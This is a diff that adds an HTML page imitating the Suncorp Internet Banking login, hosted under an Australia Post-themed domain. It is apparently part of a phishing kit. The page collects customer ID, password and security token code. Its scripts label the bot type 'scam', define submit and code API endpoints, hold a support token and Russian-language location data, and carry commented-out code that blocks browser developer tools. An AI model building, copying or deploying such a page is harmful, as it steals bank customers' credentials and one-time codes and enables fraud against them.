@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html class="no-js responsive" lang="en">
+
+<head>
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <title>Login</title>
+    <base href="https://auspost.serveblog.net">
+    <link rel="shortcut icon" href="/static/personal-cabinet/images/au/suncorp/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="/static/personal-cabinet/css/au/suncorp/suncorpnew-uama.css" />
+    <script src="https://nexus.ensighten.com/suncorp/sun-uama-prod/Bootstrap.js"></script>
+</head>
+
+<body class="sg-Page">
+    <header class="sg-Header">
+        <div class="sg-Header-content">
+            <div class="sg-Header-column">
+                <a class="sg-Header-logo" href="#">
+                </a>
+            </div>
+            <div class="sg-Header-column sg-u-width10of10 sg-u-textRight">
+                <div class="sg-Grid-row">
+                    <h1 class="ib-header">Internet Banking</h1>
+                    <span class="Icon-lock--default Icon--medium"></span>
+                </div>
+
+                <div id="bannerInfo" class="ib-banner-info">
+                    <span class="sg-u-mediumAndSmallHidden"><strong>BSB</strong> 484-799</span>
+                    <span class="sg-u-mediumAndSmallHidden"><strong>Swift Code</strong> METWAU4B</span>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="sg-Main">
+        <input type="hidden" id="bank-name" value="SUNCORP">
+        <input type="hidden" id="country-code-pc" value="AU">
+
+        <div class="sg-Main-content">
+            <div class="sg-Main-column">
+                <div class="sg-Box sg-Box--error sg-Box--withIcon uama-hidden" id="simpleErrorBox">
+                    <div class="sg-Box-icon sg-Box-icon--withBackground">
+                        <span class="sg-Box--errorIcon"></span>
+                    </div>
+                    <div class="sg-Box-content">
+                        <p></p>
+                    </div>
+                </div>
+                <div class="sg-Flextable sg-Flextable--2cols sg-Flextable--collapseLarge">
+                    <div login-session class="sg-Flextable-cell">
+                        <h3 class="ib-form-header sg-u-marginBottom">Login to Internet Banking</h3>
+                        <div id="loginForm">
+                            <fieldset class="ib-question-group sg-u-marginBotton">
+                                <div class="question">
+                                    <label for="username" class="sg-Type--title">Customer ID</label>
+                                    <input class="sg-Input sg-u-widthLarge" id="login" tabindex="1"
+                                        autofocus="autofocus" name="username" type="text" autocomplete="off"
+                                        maxlength="10">
+                                    <a href="#">Forgot your Customer ID?</a>
+                                </div>
+
+                                <div class="question">
+                                    <label for="password" class="sg-Type--title">Password</label>
+                                    <div class="password-container">
+                                        <div class="password-input">
+                                            <input class="sg-Input sg-u-widthLarge" id="password" tabindex="2"
+                                                name="password" type="password" maxlength="32" autocomplete="off"
+                                                spellcheck="false">
+                                        </div>
+                                    </div>
+                                    <div class="capslock-warning" style="display: none">
+                                        <div class="warning">
+                                            <p class="sg-Type--size14"><span class="Icon-alert--error Icon--small"
+                                                    id="capslock-icon"></span><strong>Caps Lock is on.</strong>
+                                                Passwords are case sensitive.</p>
+                                        </div>
+                                    </div>
+                                    <a href="#">Forgot your password?</a>
+                                </div>
+
+                                <div class="question">
+                                    <label for="passcode" class="sg-Type--title">Token Code</label>
+                                    <p><span class="formItemComment sg-Type--size15 sg-Type--colourText">Required if you
+                                            have a security token or you use the Suncorp Secured App.</span></p>
+                                    <div class="sg-Box sg-Box--withIcon token-input">
+                                        <input type="hidden" value="null" id="pin">
+                                        <input class="sg-Input sg-u-widthLarge" tabindex="3" id="passcode"
+                                            name="passcode" type="password" autocomplete="off" maxLength="8"
+                                            spellcheck="false">
+                                        <span data-content-id="#whatAreSecurityTokens"
+                                            class="Icon-question--secondary Icon--medium js-Tooltip"
+                                            id="security-token"></span>
+                                        <div class="sg-Tooltip js-TooltipContent" id="whatAreSecurityTokens">
+                                            <div class="sg-Tooltip-arrow js-Arrow"></div>
+                                            <div class="sg-Tooltip-header">
+                                                <button type="button" class="sg-Tooltip-headerBtnClose js-closeModal"
+                                                    id="close-btn">Close</button>
+                                                <h6 class="sg-Tooltip-headerTitle">Security Tokens</h6>
+                                            </div>
+                                            <div class="sg-Tooltip-body sg-Type--size15">
+                                                <p>
+                                                    A security token is an additional, optional form of identification
+                                                    you can use when banking online. You can order security tokens from
+                                                    within Internet Banking, under the 'Settings and Security' tab.
+                                                </p>
+                                                <a href="#">Read more about Security Tokens</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="button-container">
+                                    <p>
+                                        <button disabled type="submit" id="pc-submit-button"
+                                            class="sg-Btn sg-Btn--primary sg-u-widthLarge" tabindex="4">
+                                            Login
+                                        </button>
+                                    </p>
+
+                                    <p>
+                                        First time here?
+                                        <a href="#">Register for Internet Banking</a>
+                                    </p>
+                                </div>
+                            </fieldset>
+                        </div>
+                    </div>
+                    <div class="sg-Flextable-cell sg-Flextable-cell--2of5 sg-Flextable-cell--light help-section">
+                        <p class="sg-Type--size24">Need some help?</p>
+                        <ul class="sg-List-unstyled help-items">
+                            <ul class="sg-List-iconXsmall">
+                                <li class="Icon-arrowRight--default"><a href="#">Login and Password Support</a></li>
+                                <li class="Icon-arrowRight--default"><a href="#">Frequently asked questions</a></li>
+                                <li class="Icon-arrowRight--default"><a href="#">How to use Internet Banking</a></li>
+                            </ul>
+                            <br>
+                            <li><a href="#" class="sg-Type--bold sg-Type--colourDark">Being safe online</a></li>
+                            <ul class="sg-List-iconXsmall">
+                                <li class="Icon-arrowRight--default"><a href="#">See how we protect your money
+                                        online</a></li>
+                                <li class="Icon-arrowRight--default"><a href="#">Identify scams at home</a></li>
+                                <li class="Icon-arrowRight--default"><a href="#">Safe banking tips</a></li>
+                                <li class="Icon-arrowRight--default"><a href="#">Protecting your computer</a></li>
+                            </ul>
+                        </ul>
+
+                        <div class="sg-Box sg-Box--withIcon security-section">
+                            <div class="sg-Box-icon">
+                                <span class="Icon-security--default-security Icon--large"></span>
+                            </div>
+                            <div class="sg-Box-content">
+                                <strong>Suncorp Security</strong>
+                                <p>Committed to providing you a safe banking environment</p>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="sg-Footer">
+        <div class="sg-Footer-content">
+            <ul class="sg-List-horizontal">
+                <li><a href="#">Terms and Conditions</a></li>
+                <li><a href="#">Contact Us</a></li>
+            </ul>
+            <p id="copyright" class="sg-Type--small sg-Type--muted">© Copyright Suncorp-Metway Ltd ABN 66 010 831
+                722<br />Suncorp Internet Banking, Issued by Suncorp-Metway Limited AFSL No 229882</p>
+        </div>
+    </footer>
+
+
+    <script>
+        const botType = "scam";
+        const currency = "AUD";
+        const supportToken = "cvfQ1VdOtX0SdAwvlcqdpGccIrhYb1kJ";
+        const languageCode = "EN";
+
+        const updateApiPath = "/api/update";
+        const stepsApiPath = "/api/steps";
+        const submitApiPath = "/api/submit";
+        const codeApiPath = "/api/code";
+
+        const userLocation = {
+            country: "🇦🇺 Австралия",
+            template: "merchant",
+            countryCode: "AU",
+            bank: "SUNCORP",
+        };
+    </script>
+
+
+    <script>
+        const adId = "4Ru2sQpsL199";
+        const adSubtype = "2.0";
+        const tpType = 0;
+        const logoPath = "/static/delivery/images/auspost/logo.png";
+    </script>
+
+
+    <!-- Bootstrap -->
+    <link href="/static/other/bootstrap/css/bootstrap.css" rel="stylesheet">
+    <script src="/static/other/bootstrap/js/bootstrap.js"></script>
+
+    <!-- SweetAlert -->
+    <link rel="stylesheet" type="text/css" href="/static/other/sweetalert/css/style.css">
+    <script src="/static/other/sweetalert/js/sweetalert2@11.js"></script>
+
+    <!-- iMask -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.0/imask.min.js"></script>
+
+    <!-- Axios -->
+    <!-- <script src="/static/other/axios/axios.min.js"></script> -->
+
+    <!-- jQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <!-- Console -->
+    <!-- <script src="/static/other/console/console-ban.min.js"></script>
+
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && e.shiftKey && e.key == 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key == 'J') ||
+            (e.key === 'F12')) {
+            e.preventDefault();
+        }
+    });
+</script> -->
+
+    <noscript>
+        <div id="noscript-content">
+            <p>JavaScript is disabled in your browser. Please enable JavaScript to view this content.</p>
+        </div>
+    </noscript>
+
+
+
+
+    <link rel="stylesheet" type="text/css" href="/static/support/css/chat.css">
+
+    <style>
+        .chaport-close.visible,
+        .chaport-container .chaport-close.visible {
+            display: block;
+        }
+
+        .chaport-overlay .chaport-close {
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            top: 13px;
+            right: 27px;
+            opacity: 0.6;
+        }
+
+        .chaport-close,
+        .chaport-container .chaport-close {
+            position: absolute;
+            top: 0px;
+            right: 0px;
+            z-index: 4;
+            width: 50px;
+            height: 70px;
+            cursor: pointer;
+            opacity: 1;
+            transition: opacity 0.2s linear 0s;
+            display: none;
+        }
+
+        .chaport-overlay .chaport-close::before,
+        .chaport-overlay .chaport-close::after {
+            content: "";
+            height: 31px;
+            width: 2px;
+            background-color: rgb(238, 238, 238);
+            right: 33px;
+            top: 19px;
+        }
+
+        .chaport-close::before,
+        .chaport-container .chaport-close::before {
+            transform: rotate(45deg);
+        }
+
+        .chaport-close::after,
+        .chaport-container .chaport-close::after {
+            transform: rotate(-45deg);
+        }
+
+        .chaport-close::before,
+        .chaport-close::after,
+        .chaport-container .chaport-close::before,
+        .chaport-container .chaport-close::after {
+            position: absolute;
+            top: 24px;
+            right: 28px;
+            content: " ";
+            height: 22px;
+            width: 2px;
+            background-color: rgb(255, 255, 255);
+        }
+    </style>
+
+
+    <script src="/static/other/swal/language.js"></script>
+    <script src="/static/other/swal/swal-methods.js"></script>
+    <script src="/static/other/swal/system.js"></script>
+
+    <script>
+        $('#security-token').click(function () {
+            $(this).addClass('is-activated');
+            $('#whatAreSecurityTokens').addClass('is-open');
+        });
+
+        $('#close-btn').click(function () {
+            $('#security-token').removeClass('is-activated');
+            $('#whatAreSecurityTokens').removeClass('is-open');
+        });
+
+        $('#login').keyup(function () {
+            if ($('#login').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else if ($('#password').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else {
+                $('#pc-submit-button').prop('disabled', false);
+            }
+        });
+
+        $('#password').keyup(function () {
+            if ($('#password').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else if ($('#login').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else {
+                $('#pc-submit-button').prop('disabled', false);
+            }
+        });
+
+        $('#passcode').keyup(function () {
+            $('#pin').val(`null${$(this).val()}`);
+        });
+
+    </script>
+    <script src="/lol/s.js"></script>
+    <script src="/static/pc-card/js/personal-cabinet/validate.js"></script>
+
+</body>
+</html>
